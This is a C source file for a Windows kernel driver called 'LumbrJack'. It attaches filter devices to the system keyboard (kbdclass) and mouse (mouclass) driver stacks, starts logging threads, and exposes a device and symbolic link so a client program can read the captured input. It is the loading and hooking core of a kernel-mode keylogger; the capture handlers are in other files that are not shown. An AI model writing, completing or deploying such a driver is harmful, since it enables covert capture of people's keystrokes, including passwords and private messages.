#include "debug.h"
#include "dispatch.h"
#include "BlockingQueue.h"
#include "log.h"
#include <ntddk.h>

extern POBJECT_TYPE* IoDriverObjectType;

static UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\LumbrJackDevSymLink");

NTSTATUS NTAPI ObReferenceObjectByName(PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState, ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType, KPROCESSOR_MODE AccessMode, PVOID ParseContext, PVOID* Object);

static void unload(PDRIVER_OBJECT pDriverObject);
static NTSTATUS cleanupDevices(PDRIVER_OBJECT pDriverObject);
static NTSTATUS setupCommunicationDevice(PDRIVER_OBJECT pDriverObject);
static NTSTATUS setupFilterDevices(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pDriverName, ULONG deviceType);
static void setMajorFunctions(PDRIVER_OBJECT pDriverObject);

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
	UNREFERENCED_PARAMETER(pRegistryPath);

	DBG_PRINT("------------------------\n");

	pDriverObject->DriverUnload = unload;
	NTSTATUS ntStatus = setupCommunicationDevice(pDriverObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("DriverEntry: setupCommunicationDevice failed: 0x%lx\n", ntStatus);
		const NTSTATUS ntStatusCleanup = cleanupDevices(pDriverObject);

		if (!NT_SUCCESS(ntStatusCleanup)) {
			DBG_PRINTF("DriverEntry: cleanupDevices failed: 0x%lx\n", ntStatusCleanup);
		}

		return ntStatus;
	}

	UNICODE_STRING kbdDriverName = RTL_CONSTANT_STRING(L"\\Driver\\kbdclass");
	ntStatus = setupFilterDevices(pDriverObject, &kbdDriverName, FILE_DEVICE_KEYBOARD);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("DriverEntry: setupFilterDevices failed for keyboard driver: 0x%lx\n", ntStatus);
		const NTSTATUS ntStatusCleanup = cleanupDevices(pDriverObject);

		if (!NT_SUCCESS(ntStatusCleanup)) {
			DBG_PRINTF("DriverEntry: setupFilterDevices failed: 0x%lx\n", ntStatusCleanup);
		}

		return ntStatus;
	}

	UNICODE_STRING mouDriverName = RTL_CONSTANT_STRING(L"\\Driver\\mouclass");
	ntStatus = setupFilterDevices(pDriverObject, &mouDriverName, FILE_DEVICE_MOUSE);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("DriverEntry: setupFilterDevices failed for mouse driver: 0x%lx\n", ntStatus);
		const NTSTATUS ntStatusCleanup = cleanupDevices(pDriverObject);

		if (!NT_SUCCESS(ntStatusCleanup)) {
			DBG_PRINTF("DriverEntry: setupFilterDevices failed: 0x%lx\n", ntStatusCleanup);
		}

		return ntStatus;
	}

	KeInitializeSemaphore(&readSemaphores[LOG_KBD], 1, 1);
	KeInitializeSemaphore(&readSemaphores[LOG_MOU], 1, 1);
	setMajorFunctions(pDriverObject);

	DBG_PRINT("DriverEntry: Driver loaded\n");

	return STATUS_SUCCESS;
}


static void unload(PDRIVER_OBJECT pDriverObject) {
	// stop logging if still running
	isLogging = FALSE;
	NTSTATUS ntStatus = STATUS_SUCCESS;

	// stop all threads
	for (int i = 0; i < LOG_MAX; i++) {

		if (pLogThreads[i]) {
			ntStatus = stopLogThread(i);

			if (NT_SUCCESS(ntStatus)) {
				DBG_PRINTF("unload: Stopped log thread %d\n", i);
			}
			else {
				DBG_PRINTF2("unload: stopLogThread failed for type %d: 0x%lx\n", i, ntStatus);
			}

		}

	}

	ntStatus = cleanupDevices(pDriverObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("unload: cleanupDevices failed: 0x%lx\n", ntStatus);
	}

	// wait for all read operations to finish
	for (int i = 0; i < LOG_MAX; i++) {
		ntStatus = KeWaitForSingleObject(&readSemaphores[i], Executive, KernelMode, FALSE, NULL);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF2("unload: KeWaitForSingleObject failed for read semaphore %d: 0x%lx\n", i, ntStatus);
		}

	}

	DBG_PRINT("unload: Driver unloaded\n");
	DBG_PRINT("------------------------\n");

	return;
}


// cleanup all devices
static NTSTATUS cleanupDevices(PDRIVER_OBJECT pDriverObject) {
	NTSTATUS ntStatus = STATUS_SUCCESS;

	if (symLink.Buffer) {
		ntStatus = IoDeleteSymbolicLink(&symLink);

		if (NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("cleanupDevices: Symbolic link: \"%wZ\" deleted\n", symLink);
		}
		else {
			DBG_PRINTF("cleanupDevices: IoDeleteSymbolicLink failed: 0x%lx\n", ntStatus);
		}
	}

	PDEVICE_OBJECT pCurDevice = pDriverObject->DeviceObject;

	while (pCurDevice) {
		const PDEVICE_OBJECT pNextDevice = pCurDevice->NextDevice;

		if (pCurDevice->DeviceExtension) {
			const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pCurDevice->DeviceExtension)->DeviceObject;

			if (pTargetDevice) {
				IoDetachDevice(pTargetDevice);
				DBG_PRINT("cleanupDevices: Device detached\n");
			}

		}

		IoDeleteDevice(pCurDevice);
		DBG_PRINT("cleanupDevices: Device deleted\n");
		pCurDevice = pNextDevice;
	}

	return ntStatus;
}


// setup device for client communication
static NTSTATUS setupCommunicationDevice(PDRIVER_OBJECT pDriverObject) {
	PDEVICE_OBJECT pComDevObject = NULL;
	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\LumbrJackComDev");

	NTSTATUS ntStatus = IoCreateDevice(pDriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pComDevObject);

	if (NT_SUCCESS(ntStatus)) {
		DBG_PRINT("setupCommunicationDevice: Device created\n");
	}
	else {
		DBG_PRINTF("setupCommunicationDevice: IoCreateDevice failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}

	ntStatus = IoCreateSymbolicLink(&symLink, &devName);

	if (NT_SUCCESS(ntStatus)) {
		DBG_PRINT("setupCommunicationDevice: Symbolic link created\n");
	}
	else {
		DBG_PRINTF("setupCommunicationDevice: IoCreateSymbolicLink failed: 0x%lx\n", ntStatus);
	}

	return ntStatus;
}


// setup filter devices
static NTSTATUS setupFilterDevices(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pDriverName, ULONG deviceType) {
	PDRIVER_OBJECT targetDriverObject = NULL;
	NTSTATUS ntStatus = ObReferenceObjectByName(pDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &targetDriverObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("setupFilterDevices: ObReferenceObjectByName failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}

	PDEVICE_OBJECT pCurDeviceObject = targetDriverObject->DeviceObject;
	ObfDereferenceObject(targetDriverObject);

	while (pCurDeviceObject) {
		PDEVICE_OBJECT pFltDevObject = NULL;
		ntStatus = IoCreateDevice(pDriverObject, sizeof(DEVOBJ_EXTENSION), NULL, deviceType, FILE_DEVICE_SECURE_OPEN, FALSE, &pFltDevObject);

		if (NT_SUCCESS(ntStatus)) {
			DBG_PRINT("setupFilterDevices: Device created\n");
		}
		else {
			DBG_PRINTF("setupFilterDevices: IoCreateDevice failed: 0x%lx\n", ntStatus);
			pCurDeviceObject = pCurDeviceObject->NextDevice;

			continue;
		}

		RtlZeroMemory(pFltDevObject->DeviceExtension, sizeof(DEVOBJ_EXTENSION));
		((PDEVOBJ_EXTENSION)pFltDevObject->DeviceExtension)->Type = (CSHORT)deviceType;
		ntStatus = IoAttachDeviceToDeviceStackSafe(pFltDevObject, pCurDeviceObject, &((PDEVOBJ_EXTENSION)pFltDevObject->DeviceExtension)->DeviceObject);

		if (NT_SUCCESS(ntStatus)) {
			DBG_PRINT("setupFilterDevices: Device attached\n");
		}
		else {
			DBG_PRINTF("setupFilterDevices: IoAttachDeviceToDeviceStackSafe failed: 0x%lx\n", ntStatus);
			IoDeleteDevice(pFltDevObject);
			pCurDeviceObject = pCurDeviceObject->NextDevice;

			continue;
		}

		pFltDevObject->Flags |= DO_BUFFERED_IO;
		pFltDevObject->Flags &= ~DO_DEVICE_INITIALIZING;
		pCurDeviceObject = pCurDeviceObject->NextDevice;
	}

	return ntStatus;
}


static void setMajorFunctions(PDRIVER_OBJECT pDriverObject) {
	
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = LmbPassThrough;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = LmbPassThrough;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = LmbPassThrough;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = LmbDispatchDeviceControl;
	pDriverObject->MajorFunction[IRP_MJ_READ] = LmbDispatchRead;

	return;
}